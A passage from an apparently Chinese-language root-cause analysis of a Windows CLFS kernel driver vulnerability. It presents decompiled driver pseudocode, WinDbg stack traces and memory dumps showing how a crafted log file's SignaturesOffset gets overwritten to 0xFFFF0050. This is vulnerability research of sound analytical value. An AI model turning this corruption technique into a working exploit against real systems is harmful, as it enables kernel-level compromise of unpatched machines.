</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsLogFcbPhysical<span style=color:#f92672>::</span><span style=color:#a6e22e>Initialize</span>(
</span></span><span style=display:flex><span>        ULONG_PTR a1,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>__int64</span> a2,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>__int64</span> a3,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> a4,
</span></span><span style=display:flex><span>        ULONG DesiredShareAccess,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>__int64</span> a6,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span> a7,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>__int64</span> a8,
</span></span><span style=display:flex><span>        PFILE_OBJECT FileObject,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> a10)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  .....
</span></span><span style=display:flex><span>  CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>AddRef</span>(v25);
</span></span><span style=display:flex><span>  EventObject <span style=color:#f92672>=</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>OpenImage</span>(<span style=color:#75715e>// 打开现有日志文件会调用这里、
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                  <span style=color:#f92672>*</span>(CClfsBaseFilePersisted <span style=color:#f92672>**</span>)(a1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>680</span>),
</span></span><span style=display:flex><span>                  <span style=color:#f92672>&amp;</span>Destination,
</span></span><span style=display:flex><span>                  (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> _CLFS_FILTER_CONTEXT <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>v88,
</span></span><span style=display:flex><span>                  a10,
</span></span><span style=display:flex><span>                  (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>v94);
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>AcquireClientContext</span>(<span style=color:#f92672>*</span>(PERESOURCE <span style=color:#f92672>**</span>)(a1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>680</span>), <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>v77);<span style=color:#75715e>// 获取客户端上下文
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (v77<span style=color:#f92672>-&gt;</span>eState <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x20</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> (<span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> (<span style=color:#66d9ef>__fastcall</span> <span style=color:#f92672>**</span>)(ULONG_PTR))(<span style=color:#f92672>*</span>(_QWORD <span style=color:#f92672>*</span>)a1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>312</span>i64))(a1) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    CClfsLogFcbPhysical<span style=color:#f92672>::</span><span style=color:#a6e22e>ResetLog</span>((CClfsLogFcbPhysical <span style=color:#f92672>*</span>)a1);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(a1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>348</span>) <span style=color:#f92672>|=</span> <span style=color:#ae81ff>0x40u</span>;
</span></span><span style=display:flex><span>    v39 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)EventObject;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>继续调试，调试器在<code>ClfsEncodeBlockPrivate</code>断下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> k
</span></span><span style=display:flex><span> <span style=color:#75715e># Child-SP          RetAddr               Call Site
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#ae81ff>00</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53916f</span><span style=color:#ae81ff>70</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d6802d     CLFS<span style=color:#f92672>!</span>ClfsEncodeBlockPrivate<span style=color:#f92672>+</span><span style=color:#ae81ff>0xee</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>01</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53916f</span>b0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d92232     CLFS<span style=color:#f92672>!</span>ClfsEncodeBlock<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1d</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>02</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53916f</span>e0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d899a0     CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>WriteMetadataBlock<span style=color:#f92672>+</span><span style=color:#ae81ff>0x152</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>03</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917070</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d6161f     CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted<span style=color:#f92672>::</span>FlushImage<span style=color:#f92672>+</span><span style=color:#ae81ff>0x40</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>04</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>539170</span>b0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d63701     CLFS<span style=color:#f92672>!</span>CClfsLogFcbPhysical<span style=color:#f92672>::</span>FlushMetadata<span style=color:#f92672>+</span><span style=color:#ae81ff>0xef</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>05</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917100</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d8eaeb     CLFS<span style=color:#f92672>!</span>CClfsLogFcbPhysical<span style=color:#f92672>::</span>Initialize<span style=color:#f92672>+</span><span style=color:#ae81ff>0xc85</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>06</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917240</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d90a2b     CLFS<span style=color:#f92672>!</span>CClfsRequest<span style=color:#f92672>::</span>Create<span style=color:#f92672>+</span><span style=color:#ae81ff>0x4ef</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>07</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917390</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d907f7     CLFS<span style=color:#f92672>!</span>CClfsRequest<span style=color:#f92672>::</span>Dispatch<span style=color:#f92672>+</span><span style=color:#ae81ff>0x97</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>539173e0</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>62</span>d90747     CLFS<span style=color:#f92672>!</span>ClfsDispatchIoRequest<span style=color:#f92672>+</span><span style=color:#ae81ff>0x87</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>09</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917430</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>668</span>abac5     CLFS<span style=color:#f92672>!</span>CClfsDriver<span style=color:#f92672>::</span>LogIoDispatch<span style=color:#f92672>+</span><span style=color:#ae81ff>0x27</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>a fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917460</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>668629</span>a4     nt<span style=color:#f92672>!</span>IofCallDriver<span style=color:#f92672>+</span><span style=color:#ae81ff>0x55</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>b fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>539174</span>a0 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>66</span>bf1dfd     nt<span style=color:#f92672>!</span>IoCallDriverWithTracing<span style=color:#f92672>+</span><span style=color:#ae81ff>0x34</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>c fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>539174f</span><span style=color:#ae81ff>0</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>66</span>c20cbe     nt<span style=color:#f92672>!</span>IopParseDevice<span style=color:#f92672>+</span><span style=color:#ae81ff>0x117d</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>d fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917660</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>66</span>c01d3a     nt<span style=color:#f92672>!</span>ObpLookupObjectName<span style=color:#f92672>+</span><span style=color:#ae81ff>0x3fe</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>e fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917830</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>66</span>c88f0f     nt<span style=color:#f92672>!</span>ObOpenObjectByNameEx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1fa</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0f</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917960</span> fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>66</span>c88ae9     nt<span style=color:#f92672>!</span>IopCreateFile<span style=color:#f92672>+</span><span style=color:#ae81ff>0x40f</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917</span>a00 fffff806<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>66</span>a0a2b5     nt<span style=color:#f92672>!</span>NtCreateFile<span style=color:#f92672>+</span><span style=color:#ae81ff>0x79</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span> fffff389<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>53917</span>a90 <span style=color:#ae81ff>00007ff</span>a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>91</span>b0d9e4     nt<span style=color:#f92672>!</span>KiSystemServiceCopyEnd<span style=color:#f92672>+</span><span style=color:#ae81ff>0x25</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span> <span style=color:#ae81ff>0000005</span><span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>`</span>ec6fe888 <span style=color:#ae81ff>00007ff</span>a<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>8</span>bc92199     ntdll<span style=color:#f92672>!</span>NtCreateFile<span style=color:#f92672>+</span><span style=color:#ae81ff>0x14</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span> <span style=color:#ae81ff>0000005</span><span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>`</span>ec6fe890 <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>00000000</span>     <span style=color:#ae81ff>0x00007ffa</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>8</span>bc92199
</span></span></code></pre></div><p><code>ClfsEncodeBlockPrivate</code>伪代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>ClfsEncodeBlockPrivate</span>(
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>struct</span> _CLFS_LOG_BLOCK_HEADER <span style=color:#f92672>*</span>a1,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> a2,
</span></span><span style=display:flex><span>        UCHAR a3,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int8</span> a4)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> ClientId_low; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>......
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  ClientId_low <span style=color:#f92672>=</span> <span style=color:#a6e22e>LOWORD</span>(a1<span style=color:#f92672>-&gt;</span>ClientId);
</span></span><span style=display:flex><span>  v21[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;                                   <span style=color:#75715e>// 段签名数组
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>(_WORD)ClientId_low <span style=color:#f92672>||</span> <span style=color:#a6e22e>HIWORD</span>(a1<span style=color:#f92672>-&gt;</span>ClientId) <span style=color:#f92672>&lt;</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int16</span>)ClientId_low <span style=color:#f92672>||</span> ClientId_low <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>9</span> <span style=color:#f92672>&gt;</span> a2 )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3222929418</span>i64;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( a4 <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x10u</span> )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3221225485</span>i64;
</span></span><span style=display:flex><span>  v8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>65809</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span><span style=color:#a6e22e>_bittest</span>(<span style=color:#f92672>&amp;</span>v8, a4) )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3221225485</span>i64;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (a1<span style=color:#f92672>-&gt;</span>Checksum <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3222929418</span>i64;
</span></span><span style=display:flex><span>  SignaturesOffset <span style=color:#f92672>=</span> a1<span style=color:#f92672>-&gt;</span>SignaturesOffset;
</span></span><span style=display:flex><span>  v10 <span style=color:#f92672>=</span> a2 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>9</span>;                                <span style=color:#75715e>// 3D
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  a1<span style=color:#f92672>-&gt;</span>Usn <span style=color:#f92672>=</span> a3;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>HIBYTE</span>(v22) <span style=color:#f92672>=</span> a3;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>ULongAdd</span>(SignaturesOffset, <span style=color:#ae81ff>2</span> <span style=color:#f92672>*</span> (a2 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>9</span>), v21) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> v21[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&lt;</span> v11 <span style=color:#f92672>||</span> (v11 <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>7</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> v21[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&gt;</span> a2 )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3222929418</span>i64;
</span></span><span style=display:flex><span>  v15 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( v10 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v14 <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span>i64;
</span></span><span style=display:flex><span>      v16 <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>;
</span></span><span style=display:flex><span>      v17 <span style=color:#f92672>=</span> <span style=color:#ae81ff>64</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int16</span> <span style=color:#f92672>*</span>)(v13 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>!=</span> v15 )
</span></span><span style=display:flex><span>        v16 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( v15 )
</span></span><span style=display:flex><span>        v17 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>      v18 <span style=color:#f92672>=</span> v17 <span style=color:#f92672>|</span> v16;
</span></span><span style=display:flex><span>      v19 <span style=color:#f92672>=</span> v15 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>9</span>;                           <span style=color:#75715e>// 段偏移
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#a6e22e>LOBYTE</span>(v22) <span style=color:#f92672>=</span> a4 <span style=color:#f92672>|</span> v18;
</span></span><span style=display:flex><span>      <span style=color:#f92672>++</span>v15;
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>(_WORD <span style=color:#f92672>*</span>)(v14 <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(_WORD <span style=color:#f92672>*</span>)(v19 <span style=color:#f92672>+</span> v13 <span style=color:#f92672>+</span> <span style=color:#ae81ff>510</span>);<span style=color:#75715e>// 循环相加，第14个段的签名会覆盖到SignatureOffset
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>(_WORD <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)v19 <span style=color:#f92672>+</span> v13 <span style=color:#f92672>+</span> <span style=color:#ae81ff>510</span>) <span style=color:#f92672>=</span> v22;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( v15 <span style=color:#f92672>&lt;</span> v10 );
</span></span><span style=display:flex><span>    v12 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(v13 <span style=color:#f92672>+</span> <span style=color:#ae81ff>16</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(v13 <span style=color:#f92672>+</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>=</span> v12 <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFC</span> <span style=color:#f92672>|</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>该代码获取<code>LOG_BLOCK_HEADER→SignaturesOffset</code>的值，在PoC内已被设为0x50，而后循环读取每个扇区的签名并覆盖到<code>SignaturesOffset</code>偏移处，此时将从0x50开始写入数据，每次写入0x2个字节。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>?</span><span style=color:#ae81ff>0xd</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Evaluate expression: <span style=color:#ae81ff>26</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>00000000</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>0000001</span>a
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> rr11
</span></span><span style=display:flex><span>r11<span style=color:#f92672>=</span>ffffab0523ecf06a
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>?</span>r11<span style=color:#f92672>-</span><span style=color:#ae81ff>0x1a</span>
</span></span><span style=display:flex><span>Evaluate expression: <span style=color:#f92672>-</span><span style=color:#ae81ff>93436410793904</span> <span style=color:#f92672>=</span> ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf050
</span></span></code></pre></div><p>在第十三个扇区覆盖时，偏移已经到了<code>SignatureOffset</code>处，第十三个扇区签名为0x0050，所以<code>SignatureOffset</code> 低2位为0050</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> <span style=color:#f92672>?</span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf050<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0xc</span>
</span></span><span style=display:flex><span>Evaluate expression: <span style=color:#f92672>-</span><span style=color:#ae81ff>93436410793880</span> <span style=color:#f92672>=</span> ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf068
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span> CLFS_LOG_BLOCK_HEADER struc ; (<span style=color:#66d9ef>sizeof</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0x70</span>, align<span style=color:#f92672>=</span><span style=color:#ae81ff>0x8</span>, copyof_491)
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000000</span> MajorVersion db <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000001</span> MinorVersion db <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000002</span> Usn db <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000003</span> db <span style=color:#f92672>?</span> ; undefined
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000004</span> ClientId dd <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000000</span><span style=color:#ae81ff>8</span> TotalSectorCount dw <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000000</span>A ValidSectorCount dw <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000000</span>C Padding dd <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000010</span> Checksum dd <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000014</span> Flags dd <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000001</span><span style=color:#ae81ff>8</span> CurrentLsn CLFS_LSN <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>00000020</span> NextLsn CLFS_LSN <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000002</span><span style=color:#ae81ff>8</span> RecordOffsets dd <span style=color:#ae81ff>16</span> <span style=color:#a6e22e>dup</span>(<span style=color:#f92672>?</span>)
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000006</span><span style=color:#ae81ff>8</span> SignaturesOffset dd <span style=color:#f92672>?</span>
</span></span></code></pre></div><p>第十四个扇区签名已经被覆盖为<code>0xFFFF</code>，再将第十四个扇区覆盖在<code>SignatureOffset</code>高两位字节，<code>SignatureOffset</code>值变为<code>0XFFFF0050</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db ffffab0523ecf000 L0x80
</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf000  <span style=color:#ae81ff>15</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>3</span>d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>3</span>d <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ....<span style=color:#f92672>=</span>.<span style=color:#f92672>=</span>.........
</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf010  <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ff ff ff ff  ................
</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf020  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ff ff ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>70</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ........p.......
</span></span><span style=display:flex><span>ffffab05<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>23</span>ecf030  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
